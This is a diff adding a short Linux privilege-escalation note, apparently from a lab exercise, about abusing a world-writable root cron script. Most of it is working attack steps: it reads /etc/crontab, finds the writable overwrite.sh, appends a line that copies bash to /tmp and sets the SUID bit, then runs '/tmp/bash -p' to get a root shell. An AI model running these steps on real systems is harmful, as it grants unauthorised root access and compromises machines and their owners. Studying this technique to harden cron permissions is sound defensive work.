@@ -1,0 +1,47 @@
+Privilege Escalation using CRON File - FILE OVERWRITE
+======================================================
+
+DETECTION:
+
+1. cat /etc/crontab
+Output:
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+2. We will explore overwrite.sh
+now trying to check permissions of overwrite.sh
+
+ls -lha /usr/local/bin/overwrite.sh
+
+-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
+
+So, we as user can write on to it.
+
+
+EXPLOITATION
+============
+
+A.
+echo 'cp /bin/bash /tmp/bash;chmod +s /tmp/bash'>>/usr/local/bin/overwrite.sh
+
+B. wait for a minute to execute overwrite.sh
+
+C. in command prompt type:
+/tmp/bash -p
+
+we will get the root shell
